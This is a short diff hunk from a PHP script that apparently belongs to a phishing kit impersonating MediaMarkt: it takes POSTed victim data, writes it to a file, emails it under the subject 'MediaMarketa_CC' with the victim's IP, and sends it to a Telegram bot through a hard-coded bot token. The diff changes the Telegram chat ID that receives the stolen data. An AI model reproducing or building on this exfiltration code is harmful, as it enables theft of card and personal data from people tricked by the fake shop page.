@@ -17,7 +17,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             fwrite($file, $message);
             fclose($file);
 			$token = "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ";
-    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1097743075&text=t=" . urlencode($message)."" );
+    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-717160730&text=t=" . urlencode($message)."" );
 			$subject = "MediaMarketa_CC : $ip";
 			$headers = "From:Info <ashraftaku@outlook.fr>\r\n";
 			$headers .= "MIME-Version: 1.0\r\n";
